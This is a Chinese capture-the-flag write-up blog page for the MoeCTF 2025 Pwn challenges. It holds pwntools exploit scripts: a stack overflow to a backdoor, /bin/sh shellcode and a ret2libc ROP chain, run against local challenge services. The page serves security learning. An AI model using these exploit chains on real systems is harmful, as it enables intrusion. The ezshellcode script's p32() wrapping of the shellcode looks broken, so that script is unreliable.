@@ -1,0 +1,1003 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>MoeCTF 2025 Pwn - 首页</title>
+
+  
+    <meta name="description" content="PWN部分">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MoeCTF 2025 Pwn">
+<meta property="og:url" content="https://stone0721.github.io/MoeCTF%202025-3/">
+<meta property="og:site_name" content="首页">
+<meta property="og:description" content="PWN部分">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://stone0721.github.io/images/cover.jpg">
+<meta property="article:published_time" content="2025-09-08T23:20:00.000Z">
+<meta property="article:modified_time" content="2025-09-11T04:25:10.076Z">
+<meta property="article:author" content="stone0721">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://stone0721.github.io/images/cover.jpg">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+    <link rel="shortcut icon" href="/images/home.ico">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"stone0721","sameAs":[],"image":"/images/cover.jpg"},"dateCreated":"2025-09-09T07:20:00+08:00","dateModified":"2025-09-11T12:25:10+08:00","datePublished":"2025-09-09T07:20:00+08:00","description":"PWN部分","headline":"MoeCTF 2025 Pwn","mainEntityOfPage":{"@type":"WebPage","@id":"https://stone0721.github.io/MoeCTF%202025-3/"},"publisher":{"@type":"Organization","name":"stone0721","sameAs":[],"image":"/images/cover.jpg","logo":{"@type":"ImageObject","url":"/images/cover.jpg"}},"url":"https://stone0721.github.io/MoeCTF%202025-3/","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/images/cover.ico" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/"><div class="main">ddddd</div><div class="sub cap">分享个人学习笔记、技术文章</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/Pwn%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">CTF Pwn 基础知识</span></a><a class="item title" href="/Web%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">CTF Reverse 基础知识</span></a><a class="item title" href="/MoeCTF%202025-5/"><span class="title">MoeCTF 2025 Web</span></a><a class="item title" href="/Reverse%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">CTF Reverse 基础知识</span></a><a class="item title" href="/MoeCTF%202025-1/"><span class="title">MoeCTF 2025 Reverse</span></a><a class="item title" href="/MoeCTF%202025-2/"><span class="title">MoeCTF 2025 Misc</span></a><a class="item title" href="/Cyber-Security-101-1/"><span class="title">Cyber Security 101 第一部分 简介</span></a><a class="item title" href="/Cyber-Security-101-2/"><span class="title">Cyber Security 101 第二部分 Linux基础知识</span></a><a class="item title" href="/MoeCTF%202025-3/"><span class="title">MoeCTF 2025 Pwn</span></a><a class="item title" href="/MoeCTF%202025-4/"><span class="title">MoeCTF 2025 Crypto</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF/">CTF</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-09-08T23:20:00.000Z">2025-09-09</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-09-11T04:25:10.076Z">2025-09-11</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>MoeCTF 2025 Pwn</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p>PWN部分</p>
+<span id="more"></span>
+
+
+
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="hellopwn"><a href="#hellopwn" class="headerlink" title="hellopwn"></a>hellopwn</h3><p><img src="/../images/MoeCTF%202025-53.png" alt="image-20250909122630297"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd = 0x1BF4F = 114511</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/MoeCTF%202025-54.png" alt="image-20250909122949775"></p>
+<p><img src="/../images/MoeCTF%202025-55.png" alt="image-20250909123758287"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;tHe_bEg1Nn1ng-of-foRM4t4e4e0b39e&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ez-u64"><a href="#ez-u64" class="headerlink" title="ez_u64"></a>ez_u64</h3><blockquote>
+<p>字节流是一种常见的数据表示形式，用于存储、传输和处理各种类型的数据。我们不妨试试用pwntools中的u64,p64,u32,p32将特定大小的字节流与整数相互转换。</p>
+</blockquote>
+<p><img src="/../images/MoeCTF%202025-57.png" alt="image-20250909124317442"></p>
+<p>第十行输出8字节的num，查看发现在 init 函数中也被引用，应该是个随机数</p>
+<p><img src="/../images/MoeCTF%202025-56.png" alt="image-20250909124246224"></p>
+<p>后面 以 %zu 格式化输入一个数，需要与 num 相等</p>
+<p>输入：无符号十进制整数 8字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    <span class="comment"># 导入 pwntools。</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) <span class="comment"># 一些基本的配置。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">54174</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Here is the hint.&quot;</span>)</span><br><span class="line">data = io.recvn(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">num = u64(data)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/MoeCTF%202025-58.png" alt="image-20250909131219302"></p>
+<p><img src="/../images/MoeCTF%202025-59.png" alt="image-20250909131243704"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;us3FUI_tHiNgS_1n_PWntO0L51d19e477&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p><img src="/../images/MoeCTF%202025-60.png" alt="image-20250909161837050"></p>
+<p>第 9 行：复制 fd &#x3D; 1 (stdout) 的进程到 v3 。之后写入 v3，即使用 stdout 输出字符串。然后关闭 fd &#x3D; 1</p>
+<p>接下来要 写入 到 fd &#x3D; fd1 的进程，0、1、2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    <span class="comment"># 导入 pwntools。</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) <span class="comment"># 一些基本的配置。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">44332</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;Can you find it?\n&quot;</span>, <span class="string">&#x27;3\n&#x27;</span>.encode())</span><br><span class="line">io.sendafter(<span class="string">&quot;like to see?\n&quot;</span>, <span class="string">&quot;flag\n&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What is its fd?\n&quot;</span>, <span class="string">&#x27;1\n&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;FlND_th3-h1dD3n-Fd2aaa2bb2b8c&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="EZtext"><a href="#EZtext" class="headerlink" title="EZtext"></a>EZtext</h3><p><img src="/../images/MoeCTF%202025-62.png" alt="image-20250909182042344"></p>
+<p><img src="/../images/MoeCTF%202025-61.png" alt="image-20250909165913924"></p>
+<p><img src="/../images/MoeCTF%202025-66.png" alt="image-20250909192212154"></p>
+<p><img src="/../images/MoeCTF%202025-65.png" alt="image-20250909192136725"></p>
+<p><img src="/../images/MoeCTF%202025-64.png" alt="image-20250909192102429"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.timeout = <span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到远程服务（替换为实际地址和端口）</span></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">49597</span>)</span><br><span class="line"><span class="comment"># 输入字节数</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Then how many bytes do you need to overflow the stack?\n&#x27;</span>, <span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor_address = <span class="number">0x4011BE</span> <span class="comment"># 获得的 `treasure` 地址</span></span><br><span class="line">payload =  cyclic(<span class="number">0x9</span>)<span class="comment"># 填满 `Buffer`</span></span><br><span class="line">payload += cyclic(<span class="number">0x8</span>) <span class="comment"># 填满暂存的 `rbp`</span></span><br><span class="line">payload += p64(backdoor_address)  <span class="comment"># 篡改返回地址为 8 字节</span></span><br><span class="line"></span><br><span class="line">io.send(payload) </span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../images/MoeCTF%202025-63.png" alt="image-20250909191941966"></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;R3tZtExt_l5_THe-ST4Rt-0F-rOP1f6d5941&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h3><p><img src="/../images/MoeCTF%202025-79.png" alt="image-20250910211610341"></p>
+<p>选择：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4 -&gt; prot = 7</span><br><span class="line">3 -&gt; prot = 4</span><br><span class="line">1 -&gt; prot = 1</span><br><span class="line">2 -&gt; prot = 3</span><br></pre></td></tr></table></figure>
+
+
+
+<p>mprotect 是一个 POSIX 系统调用，用于修改指定内存区域的保护属性。它的函数原型（在 Linux 中）如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">addr：要修改保护属性的内存起始地址，必须是页面对齐的（通常是 4KB 的倍数，具体取决于系统页面大小）。</span><br><span class="line">len：要修改的内存区域长度（以字节为单位）。</span><br><span class="line">prot：新的保护标志，可以是以下值的组合（通过位或 | 运算）：</span><br><span class="line">- 1：PROT_READ：内存可读。     </span><br><span class="line">- 2：1PROT_WRITE：内存可写。</span><br><span class="line">- 4：PROT_EXEC：内存可执行。</span><br><span class="line">- 0：PROT_NONE：内存不可访问。</span><br><span class="line"></span><br><span class="line">这些权限可以通过位或运算（|）组合使用。例如：</span><br><span class="line">PROT_READ | PROT_WRITE = 1 | 2 = 3（可读可写）。</span><br><span class="line">PROT_READ | PROT_WRITE | PROT_EXEC = 1 | 2 | 4 = 7（可读、可写、可执行）。</span><br><span class="line">PROT_NONE = 0（无权限）。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/MoeCTF%202025-80.png" alt="image-20250910212410271"></p>
+<p>那现在我们的选择是 7 </p>
+<p><img src="/../images/MoeCTF%202025-81.png" alt="image-20250910212949267"></p>
+<p>给 s 设置了可读可写可执行的权限，现在向 s 地址处读入一段代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    <span class="comment"># 导入 pwntools。</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) <span class="comment"># 一些基本的配置。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。</span></span><br><span class="line"></span><br><span class="line">io = connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">31412</span>)    <span class="comment"># 与在线环境交互。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 /bin/sh 的 shellcode（汇编代码）</span></span><br><span class="line">shellcode_asm = shellcraft.amd64.linux.sh()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 asm() 汇编成二进制</span></span><br><span class="line">shellcode_bin = asm(shellcode_asm)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Choose wisely!&#x27;</span>, <span class="string">b&#x27;4\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload  = p32(shellcode_bin)  </span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;you just set.&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()                    <span class="comment"># 手动接收 flag。</span></span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;p0WErFUL_sh3I1c0D3-C@N_Do-AnyTHing9a63c&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="prelibc"><a href="#prelibc" class="headerlink" title="prelibc"></a>prelibc</h3><p><img src="/../images/MoeCTF%202025-82.png" alt="image-20250910215134643"></p>
+<p>接下来读 0x100 字节到 buf</p>
+<p><img src="/../images/MoeCTF%202025-83.png" alt="image-20250910215230197"></p>
+<p><img src="/../images/MoeCTF%202025-84.png" alt="image-20250910215707043"></p>
+<p><img src="/../images/MoeCTF%202025-85.png" alt="image-20250910221227267"></p>
+<p><img src="/../images/MoeCTF%202025-86.png" alt="image-20250910221412128"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf:  606F0</span><br><span class="line">system:  50D70</span><br></pre></td></tr></table></figure>
+
+<p>已知：<code>printf：0x7935fa860100</code></p>
+<p>将可执行文件的 libc.so.6 依赖替换为我们的 libc.so.6：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改二进制文件的库搜索路径</span></span><br><span class="line">patchelf --set-interpreter ~/MoeCTF2025/prelibc/ld-linux-x86-64.so.2 ./pwn   <span class="comment"># 指定动态链接器</span></span><br><span class="line">patchelf --set-rpath ~/MoeCTF2025/prelibc ./pwn    <span class="comment"># 指定 libc.so.6的搜索路径</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(MoeCTF-<span class="built_in">env</span>) yang@yang:~/MoeCTF2025/pwn/prelibc$ strings libc.so.6 |grep Ubuntu</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.10) stable release version 2.35.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = libc.sym[<span class="string">&#x27;printf&#x27;</span>]<span class="comment">#这里的system可以替换成别的函数，用于搜索偏移</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><img src="/../images/MoeCTF%202025-87.png" alt="image-20250911090148935"></p>
+<p>左边可以看到注入的 system 地址是 0x7bde73e50780，而程序也跳转到这里执行，但是并不是 system 命令</p>
+<p>说明我们计算的地址出错了。</p>
+<p><img src="/../images/MoeCTF%202025-88.png" alt="image-20250911091846040"></p>
+<p><img src="/../images/MoeCTF%202025-89.png" alt="image-20250911095357738"></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载特定版本的 glibc 源码</span></span><br><span class="line">wget https://ftp.gnu.org/gnu/glibc/glibc-2.35.tar.gz</span><br><span class="line">tar -xf glibc-2.35.tar.gz</span><br><span class="line"><span class="built_in">cd</span> glibc-2.35</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译（需要指定安装目录）</span></span><br><span class="line"><span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> build</span><br><span class="line">../configure --prefix=/home/yang/MoeCTF2025/pwn/prelibc/glibc-2.35-install</span><br><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 ld-linux</span></span><br><span class="line"><span class="built_in">cp</span> /home/yang/MoeCTF2025/pwn/prelibc/glibc-2.35-install/lib/ld-linux-x86-64.so.2  ./ld-linux-x86-64.so.2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ~/MoeCTF2025/prelibc/ld-linux-x86-64.so.2 ./pwn   <span class="comment"># 指定动态链接器</span></span><br><span class="line">patchelf --set-rpath ~/MoeCTF2025/prelibc ./pwn    <span class="comment"># 指定 libc.so.6的搜索路径</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/MoeCTF%202025-90.png" alt="image-20250911103022231"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rodata:00000000001D8678 aBinSh          db &#x27;/bin/sh&#x27;,0     </span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>在 x86-64 调用约定中，system 的第一个参数通过 rdi 寄存器传递。因此，需要一个 ROP gadget 设置 rdi &#x3D; bin_sh_address，然后跳转到 system。</p>
+</blockquote>
+<p><img src="/../images/MoeCTF%202025-92.png" alt="image-20250911110639703"></p>
+<p><img src="C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250911114223007.png" alt="image-20250911114223007"></p>
+<p><img src="/../images/MoeCTF%202025-93.png" alt="image-20250911120059063"></p>
+<p>终于成功了</p>
+<p><img src="/../images/MoeCTF%202025-94.png" alt="image-20250911120202719"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># 直接启动 gdb 调试</span></span><br><span class="line">io = connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">19063</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;the location of &#x27;printf&#x27;: &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_address = io.recvline().strip() <span class="comment"># 读取 `printf` 的地址。</span></span><br><span class="line"></span><br><span class="line">printf_address = <span class="built_in">int</span>(printf_address, <span class="number">16</span>) <span class="comment"># 转换为整数。</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_address))</span><br><span class="line"></span><br><span class="line">system_add = <span class="number">0x50d70</span></span><br><span class="line">printf_add = <span class="number">0x606f0</span></span><br><span class="line">shell_add = <span class="number">0x1D8678</span></span><br><span class="line">pop_rdi_ret_add = <span class="number">0x2a3e5</span></span><br><span class="line">ret_add = <span class="number">0x404f0</span></span><br><span class="line"></span><br><span class="line">system_address  = printf_address  + system_add - printf_add</span><br><span class="line">shell_address = printf_address + shell_add - printf_add</span><br><span class="line">pop_rdi_ret = printf_address + pop_rdi_ret_add - printf_add</span><br><span class="line">ret = printf_address + ret_add - printf_add</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">64</span>)  <span class="comment"># 填充 buffer</span></span><br><span class="line">payload += cyclic(<span class="number">8</span>)  <span class="comment"># 填充 rbp</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret)  <span class="comment"># 先调用 pop rdi; ret</span></span><br><span class="line">payload += p64(shell_address)  <span class="comment"># 弹出 shell_address 到 rdi</span></span><br><span class="line">payload += p64(ret)  <span class="comment"># 栈对齐</span></span><br><span class="line">payload += p64(system_address)  <span class="comment"># 跳转到 system</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()                    <span class="comment"># 手动接收 flag。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 